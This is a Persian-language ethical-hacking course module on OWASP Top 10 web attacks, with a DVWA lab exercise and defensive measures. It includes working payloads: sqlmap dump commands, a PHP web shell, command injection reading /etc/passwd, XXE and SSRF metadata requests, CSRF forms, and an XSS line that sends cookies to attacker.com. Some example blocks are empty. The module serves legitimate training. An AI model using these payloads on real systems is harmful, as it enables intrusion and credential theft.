🔰 مقدمه – برنامه‌های وب و حملات به آنها

برنامه‌های وب (Web Applications) نرم‌افزارهایی هستند که از طریق مرورگر وب قابل دسترسی هستند و تعامل پویایی با کاربران دارند. این برنامه‌ها امروزه قلب تپنده کسب‌وکارهای آنلاین، بانک‌داری، شبکه‌های اجتماعی و خدمات ابری هستند.

با افزایش محبوبیت برنامه‌های وب، حملات به آنها نیز به یکی از رایج‌ترین تهدیدات سایبری تبدیل شده است. حملات به برنامه‌های وب می‌توانند به سرقت اطلاعات حساس، دستکاری داده‌ها، و حتی کنترل کامل سرور منجر شوند.

در این ماژول، با رایج‌ترین آسیب‌پذیری‌های برنامه‌های وب (بر اساس OWASP Top 10)، روش‌های شناسایی، بهره‌برداری و مقابله با آنها آشنا خواهید شد.

⚠️ هشدار اخلاقی: حملات به برنامه‌های وب بدون مجوز جرم هستند. تمام تمرینات این ماژول فقط در محیط‌های آزمایشگاهی با مجوز انجام شوند.

🏗️ معماری برنامه‌های وب (Web Application Architecture)

برای درک آسیب‌پذیری‌های برنامه‌های وب، ابتدا باید معماری آنها را بشناسید:

📌 اجزای اصلی:

  • کلاینت (Client): مرورگر کاربر که درخواست‌ها را ارسال می‌کند.
  • وب‌سرور (Web Server): درخواست‌ها را دریافت و صفحات را ارائه می‌دهد.
  • اپلیکیشن سرور (Application Server): منطق برنامه را اجرا می‌کند (PHP, ASP.NET, Node.js, Python).
  • پایگاه داده (Database): داده‌های برنامه را ذخیره می‌کند.
  • APIها: ارتباط بین اجزا را مدیریت می‌کنند.

📌 مدل‌های معماری:

  • Single-Tier: همه اجزا روی یک سرور.
  • Two-Tier: کلاینت و سرور (Client-Server).
  • Three-Tier: کلاینت، سرور برنامه، پایگاه داده.
  • N-Tier (Microservices): چندین سرویس مجزا.
💡 نکته: هرچه معماری پیچیده‌تر باشد، نقاط حمله بیشتری وجود دارد.

📋 OWASP Top 10

OWASP (Open Web Application Security Project) یک سازمان غیرانتفاعی است که به بهبود امنیت برنامه‌های وب می‌پردازد. لیست ۱۰ آسیب‌پذیری برتر OWASP (OWASP Top 10) یک مرجع استاندارد برای شناسایی خطرناک‌ترین آسیب‌پذیری‌های برنامه‌های وب است.

📌 OWASP Top 10 (نسخه ۲۰۲۱):

  1. شکست در کنترل دسترسی (Broken Access Control): نقض سیاست‌های دسترسی.
  2. شکست در رمزنگاری (Cryptographic Failures): استفاده از رمزنگاری ضعیف یا عدم استفاده.
  3. تزریق (Injection): تزریق کد مخرب (SQL, Command, LDAP).
  4. طراحی ناامن (Insecure Design): نقص در طراحی امنیتی برنامه.
  5. پیکربندی ناامن (Security Misconfiguration): تنظیمات اشتباه امنیتی.
  6. اجزای آسیب‌پذیر و قدیمی (Vulnerable and Outdated Components): استفاده از کتابخانه‌های قدیمی.
  7. شکست در شناسایی و احراز هویت (Identification and Authentication Failures): ضعف در احراز هویت.
  8. شکست در یکپارچگی نرم‌افزار و داده (Software and Data Integrity Failures): نقض یکپارچگی داده‌ها.
  9. شکست در نظارت و لاگ‌گیری (Security Logging and Monitoring Failures): عدم پایش کافی.
  10. جعل درخواست بین‌سایتی (Server-Side Request Forgery - SSRF): درخواست‌های جعلی از سمت سرور.
💡 نکته: OWASP Top 10 به‌روزترین منبع برای شناسایی آسیب‌پذیری‌های رایج برنامه‌های وب است.

🗄️ تزریق SQL (SQL Injection - SQLi)

SQL Injection یکی از معروف‌ترین و خطرناک‌ترین آسیب‌پذیری‌های برنامه‌های وب است که در آن مهاجم با تزریق کد SQL به ورودی‌های برنامه، به پایگاه داده دسترسی پیدا می‌کند.

📌 انواع SQL Injection:

  • In-band SQLi: مهاجم از همان کانال برای تزریق و دریافت داده استفاده می‌کند.
  • Blind SQLi: مهاجم پاسخ مستقیم دریافت نمی‌کند و از تفاوت‌های برنامه استفاده می‌کند.
  • Out-of-band SQLi: مهاجم از کانال دیگری برای دریافت داده استفاده می‌کند.

📌 مثال SQL Injection:

# کد آسیب‌پذیر PHP
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

# حمله: تزریق ' OR '1'='1
# ورودی: username = admin' --  (یا admin' OR '1'='1)
# کوئری نهایی: SELECT * FROM users WHERE username='admin' --' AND password=''
# که همیشه true برمی‌گرداند

📌 ابزارهای SQL Injection:

  • SQLmap: ابزار خودکار برای تشخیص و بهره‌برداری از SQLi.
  • Burp Suite: با پسوندهای مختلف.
  • Havij: ابزار گرافیکی.
  • jSQL: ابزار جاوا.
# استفاده از SQLmap برای تشخیص SQLi
sqlmap -u "http://192.168.1.101/page.php?id=1" --dbs

# استخراج جداول
sqlmap -u "http://192.168.1.101/page.php?id=1" -D database_name --tables

# استخراج داده‌ها
sqlmap -u "http://192.168.1.101/page.php?id=1" -D database_name -T table_name --dump
⚠️ هشدار: SQL Injection می‌تواند به نشت کامل داده‌های پایگاه داده منجر شود. همیشه ورودی‌ها را فیلتر کنید.

💉 Cross-Site Scripting (XSS)

XSS یک آسیب‌پذیری است که در آن مهاجم کدهای جاوااسکریپت مخرب را به صفحات وب تزریق می‌کند. این کدها در مرورگر قربانی اجرا شده و می‌توانند کوکی‌ها را بدزدند، صفحات را تغییر دهند یا حملات فیشینگ انجام دهند.

📌 انواع XSS:

  • Reflected XSS: کد مخرب در URL یا فرم ارسال شده و بلافاصله بازگردانده می‌شود.
  • Stored XSS (Persistent): کد مخرب در پایگاه داده ذخیره می‌شود و برای همه کاربران نمایش داده می‌شود.
  • DOM-based XSS: کد مخرب از طریق دستکاری DOM در مرورگر اجرا می‌شود.

📌 مثال XSS:

# تزریق کد جاوااسکریپت


# سرقت کوکی


# تغییر محتوای صفحه

📌 ابزارهای XSS:

  • Burp Suite: برای تست دستی.
  • OWASP ZAP: اسکن خودکار XSS.
  • XSStrike: ابزار تخصصی XSS.
  • BeEF: چارچوب بهره‌برداری از مرورگر.
💡 نکته: برای جلوگیری از XSS، ورودی‌ها را فیلتر کنید و از توابع escape مانند htmlspecialchars() استفاده کنید.

🔄 Cross-Site Request Forgery (CSRF)

CSRF یک حمله است که در آن مهاجم کاربر را فریب می‌دهد تا یک درخواست ناخواسته را به یک وب‌سایت که کاربر به آن اعتماد دارد، ارسال کند. این حمله از کوکی‌های ذخیره‌شده در مرورگر برای احراز هویت استفاده می‌کند.

📌 نحوه عملکرد:

  1. کاربر وارد وب‌سایت هدف می‌شود (کوکی فعال است).
  2. کاربر روی یک لینک مخرب کلیک می‌کند یا از یک وب‌سایت آلوده بازدید می‌کند.
  3. وب‌سایت آلوده یک درخواست به وب‌سایت هدف ارسال می‌کند (با استفاده از کوکی کاربر).
  4. وب‌سایت هدف درخواست را به عنوان درخواست معتبر کاربر پردازش می‌کند.

📌 مثال CSRF:

<img src="http://bank.com/transfer?amount=1000&to=attacker" />

<form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="to" value="attacker" />
</form>
<script>document.forms[0].submit();</script>

📌 راه‌های مقابله با CSRF:

  • CSRF Tokens: افزودن توکن تصادفی به فرم‌ها و تأیید آن در سرور.
  • SameSite Cookies: تنظیم کوکی با SameSite=Strict یا Lax.
  • Referer/Origin Validation: بررسی هدر Referer.
  • احراز هویت چندعاملی (MFA): برای تراکنش‌های حساس.
⚠️ هشدار: CSRF یکی از خطرناک‌ترین حملات است و می‌تواند باعث انتقال وجه، تغییر رمز و سایر اقدامات مخرب شود.

🔑 ربودن جلسه (Session Hijacking)

ربودن جلسه در برنامه‌های وب به سرقت شناسه جلسه (Session ID) کاربر و استفاده از آن برای دسترسی به حساب کاربری گفته می‌شود. این حمله معمولاً پس از احراز هویت انجام می‌شود.

📌 روش‌های ربودن جلسه در برنامه‌های وب:

  • سرقت کوکی: از طریق XSS، Sniffing، یا مهندسی اجتماعی.
  • Session Fixation: تحمیل Session ID به کاربر قبل از ورود.
  • MITM: شنود ترافیک HTTP و استخراج Session ID.
  • Predictable Session ID: حدس Session IDهای ضعیف.

📌 مثال Session Hijacking:

# استخراج کوکی با XSS


# استفاده از کوکی دزدیده شده در مرورگر مهاجم
# تنظیم کوکی در Developer Tools -> Application -> Cookies
# بازسازی جلسه با همان Session ID
💡 نکته: استفاده از تنظیمات HttpOnly و Secure برای کوکی‌ها، و تغییر Session ID پس از ورود، از Session Hijacking جلوگیری می‌کند.

📤 آسیب‌پذیری آپلود فایل (File Upload Vulnerability)

آسیب‌پذیری آپلود فایل زمانی رخ می‌دهد که یک برنامه وب به کاربران اجازه می‌دهد فایل‌هایی را آپلود کنند بدون اینکه به درستی نوع و محتوای فایل را بررسی کند. این آسیب‌پذیری می‌تواند به اجرای کد مخرب روی سرور منجر شود.

📌 حملات رایج آپلود فایل:

  • آپلود Web Shell: آپلود یک فایل PHP/ASP که به مهاجم دسترسی به سرور می‌دهد.
  • آپلود بدافزار: قرار دادن بدافزار روی سرور.
  • Directory Traversal: آپلود فایل در دایرکتوری‌های حساس.
  • Double Extension: استفاده از پسوندهای دوگانه (مثل .php.jpg).
  • MIME Type Bypass: تغییر نوع MIME فایل برای دور زدن فیلترها.

📌 مثال Web Shell:

<?php system($_GET['cmd']); ?>

# آپلود فایل با نام shell.php
# سپس اجرای دستورات از طریق:
http://192.168.1.101/uploads/shell.php?cmd=id
⚠️ هشدار: آپلود Web Shell یکی از رایج‌ترین راه‌های نفوذ به سرور است. همیشه فایل‌های آپلودی را به دقت بررسی کنید.

🔐 IDOR (Insecure Direct Object Reference)

IDOR یک آسیب‌پذیری کنترل دسترسی است که در آن برنامه وب به کاربران اجازه می‌دهد به اشیاء (مانند فایل‌ها، رکوردهای پایگاه داده) بدون بررسی مجوز دسترسی پیدا کنند.

📌 مثال IDOR:

# درخواست معمولی کاربر:
GET /user/profile?id=123

# حمله IDOR: تغییر ID به ID کاربر دیگر
GET /user/profile?id=124

# اگر برنامه مجوز را بررسی نکند، مهاجم به پروفایل کاربر دیگر دسترسی پیدا می‌کند.

📌 تشخیص IDOR:

  • بررسی پارامترهای URL و فرم‌ها برای شناسه‌های عددی یا قابل حدس.
  • تغییر شناسه‌ها و مشاهده پاسخ سرور.
  • استفاده از Burp Suite برای دستکاری درخواست‌ها.
💡 نکته: برای جلوگیری از IDOR، همیشه مجوز دسترسی کاربر را قبل از نمایش هر داده‌ای بررسی کنید و از شناسه‌های غیرقابل حدس (مانند UUID) استفاده کنید.

⌨️ تزریق دستور (Command Injection)

Command Injection زمانی رخ می‌دهد که برنامه وب، ورودی کاربر را بدون فیلتر کردن به عنوان دستور سیستم‌عامل اجرا می‌کند. این آسیب‌پذیری به مهاجم اجازه می‌دهد دستورات دلخواه را روی سرور اجرا کند.

📌 مثال Command Injection:

# کد آسیب‌پذیر PHP
$command = $_GET['cmd'];
system($command);

# حمله: ارسال دستور از طریق URL
http://192.168.1.101/page.php?cmd=id
http://192.168.1.101/page.php?cmd=ls%20-la
http://192.168.1.101/page.php?cmd=cat%20/etc/passwd

📌 ابزارهای Command Injection:

  • Burp Suite: برای تست دستی.
  • Commix: ابزار خودکار Command Injection.
  • Metasploit: ماژول‌های Command Injection.
⚠️ هشدار: Command Injection یکی از خطرناک‌ترین آسیب‌پذیری‌هاست و می‌تواند به کنترل کامل سرور منجر شود.

📄 XXE (XML External Entity Injection)

XXE یک آسیب‌پذیری است که در برنامه‌هایی که XML را پردازش می‌کنند، رخ می‌دهد. مهاجم با تزریق یک موجودیت خارجی، می‌تواند فایل‌های سیستمی را بخواند، درخواست‌های SSRF انجام دهد یا باعث DoS شود.

📌 مثال XXE:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
💡 نکته: برای جلوگیری از XXE، پردازش موجودیت‌های خارجی را در پردازشگر XML غیرفعال کنید.

🌐 SSRF (Server-Side Request Forgery)

SSRF یک آسیب‌پذیری است که در آن مهاجم می‌تواند سرور را وادار کند تا درخواست‌هایی به آدرس‌های دلخواه (مثل سرورهای داخلی) ارسال کند.

📌 مثال SSRF:

# پارامتر آسیب‌پذیر: url=http://example.com
GET /fetch?url=http://internal-server/admin

# حمله: دسترسی به سرورهای داخلی
GET /fetch?url=http://169.254.169.254/latest/meta-data/  # (در AWS)
⚠️ هشدار: SSRF می‌تواند به افشای اطلاعات حساس از سرورهای داخلی منجر شود.

🛠️ ابزارهای هک برنامه‌های وب

ابزارهای متعددی برای تست و هک برنامه‌های وب وجود دارند که در این بخش مهم‌ترین آنها را معرفی می‌کنیم:

ابزارکاربرد اصلیتوضیح
Burp Suite تست نفوذ وب قدرتمندترین ابزار، با قابلیت Proxy, Scanner, Repeater, Intruder
OWASP ZAP تست نفوذ وب نسخه متن‌باز Burp Suite
SQLmap SQL Injection ابزار خودکار تشخیص و بهره‌برداری SQLi
Nikto اسکن وب‌سرور بررسی پیکربندی و آسیب‌پذیری‌ها
Gobuster اسکن دایرکتوری پیدا کردن دایرکتوری‌ها و فایل‌های مخفی
XSStrike XSS ابزار تخصصی XSS
Commix Command Injection ابزار خودکار Command Injection
WPScan هک وردپرس اسکن آسیب‌پذیری وردپرس
BeEF بهره‌برداری از مرورگر چارچوب XSS و کنترل مرورگر 
# استفاده از Burp Suite (راه‌اندازی)
burpsuite

# استفاده از SQLmap
sqlmap -u "http://192.168.1.101/page.php?id=1" --dbs

# استفاده از XSStrike
xsstrike -u "http://192.168.1.101/page.php?q=test"

# استفاده از Commix
commix --url "http://192.168.1.101/page.php?cmd=ping"
💡 نکته: Burp Suite و SQLmap دو تا از قدرتمندترین ابزارهای هک برنامه‌های وب هستند.

🤖 هوش مصنوعی در هک برنامه‌های وب

CEH v13 به عنوان اولین نسخه‌ای که هوش مصنوعی را در تمام مراحل هک قانونمند ادغام کرده، به نقش هوش مصنوعی در هک برنامه‌های وب نیز می‌پردازد.

📌 نقش هوش مصنوعی در هک برنامه‌های وب:

  • تشخیص خودکار آسیب‌پذیری‌ها: AI می‌تواند کد برنامه را تحلیل کرده و آسیب‌پذیری‌ها را پیدا کند.
  • تولید Payloadهای هوشمند: AI می‌تواند payloadهایی تولید کند که از تشخیص فرار کنند.
  • اسکن هوشمند: AI می‌تواند اسکن‌های هدفمند و کارآمدتری انجام دهد.
  • تحلیل لاگ‌ها: AI می‌تواند الگوهای حمله را در لاگ‌ها پیدا کند.

📌 ابزارهای AI-Powered Web Application Hacking:

  • AI-Based Vulnerability Scanners: اسکنرهای مبتنی بر AI.
  • AI-Powered Payload Generators: تولید payloadهای هوشمند.
  • AI-Driven WAF Bypass: دور زدن WAF با AI.
💡 چرا هوش مصنوعی در هک برنامه‌های وب مهم است؟

هوش مصنوعی می‌تواند آسیب‌پذیری‌های پیچیده‌تر را شناسایی کند و حملات را به گونه‌ای طراحی کند که از WAF و IDS عبور کند.

🛡️ راه‌های مقابله با حملات برنامه‌های وب

برای محافظت از برنامه‌های وب در برابر حملات، سازمان‌ها و توسعه‌دهندگان باید اقدامات زیر را انجام دهند:

📌 اقدامات کلی:

  • فیلتر کردن ورودی‌ها (Input Validation): تمام ورودی‌های کاربر را اعتبارسنجی کنید.
  • استفاده از Prepared Statements: برای جلوگیری از SQL Injection.
  • رمزگشایی خروجی‌ها (Output Encoding): برای جلوگیری از XSS.
  • استفاده از CSRF Tokens: در تمام فرم‌های حساس.
  • تنظیمات امن کوکی: HttpOnly, Secure, SameSite.
  • استفاده از WAF (Web Application Firewall): محافظت در برابر حملات.
  • به‌روزرسانی منظم: نصب وصله‌های امنیتی.
  • آموزش توسعه‌دهندگان: آموزش کدنویسی امن.

📌 اقدامات خاص برای هر نوع حمله:

  • SQL Injection: Prepared Statements, Stored Procedures, Input Validation.
  • XSS: Output Encoding, Content Security Policy (CSP), HttpOnly Cookies.
  • CSRF: CSRF Tokens, SameSite Cookies, Referer Validation.
  • File Upload: بررسی نوع فایل، محدود کردن پسوندها، ذخیره خارج از ریشه وب.
  • IDOR: بررسی مجوز دسترسی، استفاده از UUID.
  • Command Injection: استفاده از توابع ایمن، فیلتر کردن ورودی‌ها.
  • XXE: غیرفعال کردن External Entities.
  • SSRF: فیلتر کردن URLها، محدود کردن دامنه‌های مجاز.
💡 نکته: بهترین دفاع در برابر حملات برنامه‌های وب، ترکیبی از کدنویسی امن، پیکربندی صحیح و استفاده از ابزارهای امنیتی است.

🧪 کارگاه عملی – هک برنامه‌های وب

در این کارگاه، شما با تکنیک‌ها و ابزارهای هک برنامه‌های وب آشنا خواهید شد و یک سناریوی کامل از نفوذ به یک برنامه وب آسیب‌پذیر را در محیط آزمایشگاهی پیاده‌سازی می‌کنید.

🎯 هدف کارگاه:

  • آشنایی با ابزارهای Burp Suite و SQLmap.
  • اجرای SQL Injection روی یک برنامه آسیب‌پذیر.
  • اجرای XSS روی یک برنامه آسیب‌پذیر.
  • اجرای CSRF و Session Hijacking.
  • مقابله با حملات.

🖥️ محیط مورد نیاز:

  • حمله‌کننده: Kali Linux
  • هدف: DVWA (Damn Vulnerable Web Application) یا Metasploitable 2
  • ابزارها: Burp Suite, SQLmap, Firefox Developer Tools

📝 سناریوی گام‌به‌گام:

مرحله ۱: راه‌اندازی محیط آزمایشگاهی

# روی Metasploitable 2
sudo service apache2 start

# دسترسی به DVWA: http://192.168.1.101/dvwa/
# ورود: admin / password

مرحله ۲: SQL Injection با SQLmap

# اسکن SQL Injection در صفحه کاربر
sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=..."

# استخراج پایگاه‌های داده
sqlmap -u "..." --dbs

# استخراج جداول
sqlmap -u "..." -D dvwa --tables

# استخراج داده‌ها
sqlmap -u "..." -D dvwa -T users --dump

مرحله ۳: XSS در DVWA

# در صفحه XSS (Reflected) ورودی زیر را امتحان کنید:
<script>alert('Hacked!')</script>

# یا سرقت کوکی:
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>

مرحله ۴: CSRF در DVWA

# در صفحه تغییر رمز عبور، یک درخواست CSRF ایجاد کنید
# از Burp Suite برای ثبت و تغییر درخواست استفاده کنید

مرحله ۵: File Upload (آپلود Web Shell)

# ایجاد یک Web Shell PHP
<?php system($_GET['cmd']); ?>

# آپلود فایل در صفحه File Upload
# سپس دسترسی به: http://192.168.1.101/dvwa/hackable/uploads/shell.php?cmd=id

مرحله ۶: مقابله با حملات

# تنظیمات امنیتی در کد برنامه
# 1. استفاده از Prepared Statements برای SQL
# 2. فیلتر کردن ورودی‌ها برای XSS
# 3. CSRF Tokens
# 4. بررسی نوع فایل برای آپلود
⏳ تکلیف: تمام مراحل بالا را در محیط آزمایشگاهی خود اجرا کنید و یک گزارش کامل از فرآیند هک برنامه وب، تشخیص و مقابله تهیه کنید.

📝 تمرین‌های عملی

این تمرینات به شما کمک می‌کنند تا مهارت‌های خود در زمینه هک برنامه‌های وب را تقویت کنید.

  • تمرین ۱ – SQL Injection:
    روی DVWA، SQL Injection را در سطح امنیتی Low انجام دهید و داده‌های پایگاه داده را استخراج کنید.
  • تمرین ۲ – XSS:
    روی DVWA، یک حمله Reflected XSS و Stored XSS را پیاده‌سازی کنید.
  • تمرین ۳ – CSRF:
    روی DVWA، یک حمله CSRF برای تغییر رمز عبور کاربر طراحی کنید.
  • تمرین ۴ – File Upload:
    روی DVWA، یک Web Shell آپلود کنید و از آن برای اجرای دستورات استفاده کنید.
  • تمرین ۵ – Burp Suite:
    با استفاده از Burp Suite، یک حمله SQL Injection را در DVWA انجام دهید.

📖 واژه‌نامه تخصصی (Glossary)

در این بخش، تمام واژه‌های تخصصی این ماژول، همراه با ساختار (ریشه یا مخفف)، تعریف ساده، کاربرد در هک، و یک مثال روزمره توضیح داده شده است.

واژه ساختار / مخفف تعریف ساده کاربرد در هک مثال
SQL Injection SQLi تزریق کد SQL به ورودی‌های برنامه. دسترسی به پایگاه داده. ' OR '1'='1
XSS Cross-Site Scripting تزریق کد جاوااسکریپت به صفحات وب. سرقت کوکی، تغییر صفحه. <script>alert(1)</script>
CSRF Cross-Site Request Forgery ارسال درخواست ناخواسته از طرف کاربر. تغییر رمز، انتقال وجه. فرم مخفی با اقدامات حساس.
IDOR Insecure Direct Object Reference دسترسی مستقیم به اشیاء بدون بررسی مجوز. دسترسی به اطلاعات کاربران دیگر. profile?id=124
Command Injection — اجرای دستورات سیستمی از طریق ورودی. کنترل کامل سرور. ?cmd=id
XXE XML External Entity تزریق موجودیت‌های خارجی به XML. خواندن فایل‌های سیستمی. <!ENTITY xxe SYSTEM "file:///etc/passwd">
SSRF Server-Side Request Forgery ارسال درخواست از سمت سرور به آدرس‌های دلخواه. دسترسی به سرورهای داخلی. ?url=http://169.254.169.254/
Web Shell — فایل مخرب برای اجرای دستورات روی سرور. کنترل سرور از طریق مرورگر. <?php system($_GET['cmd']); ?>
WAF Web Application Firewall فایروال برنامه‌های وب. محافظت در برابر حملات. Cloudflare WAF.
Burp Suite — ابزار تست نفوذ وب. دستکاری درخواست‌ها، اسکن آسیب‌پذیری. Proxy, Intruder, Repeater.
SQLmap — ابزار خودکار SQL Injection. تشخیص و بهره‌برداری SQLi. sqlmap -u "http://..." --dbs
DVWA Damn Vulnerable Web Application برنامه وب آسیب‌پذیر برای تمرین. محیط آزمایشگاهی برای هک. http://192.168.1.101/dvwa/
